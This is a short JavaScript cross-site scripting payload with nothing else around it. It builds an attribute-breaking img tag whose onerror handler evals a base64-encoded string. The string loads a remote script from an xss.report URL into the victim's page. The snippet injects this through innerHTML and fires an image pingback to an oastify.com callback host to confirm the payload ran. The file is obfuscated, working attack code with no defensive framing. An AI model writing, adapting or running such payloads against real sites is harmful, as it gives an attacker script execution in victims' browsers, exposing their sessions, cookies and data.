// Constructing the payload string
const payload = '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2Jvb202NzAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>';

// Injecting the payload into a target element
document.getElementById('targetElement').innerHTML = payload;

// Send a request to the specified URL when the script is executed
function sendPingback() {
    const pingbackUrl = 'https://176fkr56hc3iwj8p7v1hjrc1zs5jtbuzj.oastify.com';
    const img = new Image();
    img.src = pingbackUrl;
}

// Call the function to send the pingback
sendPingback();
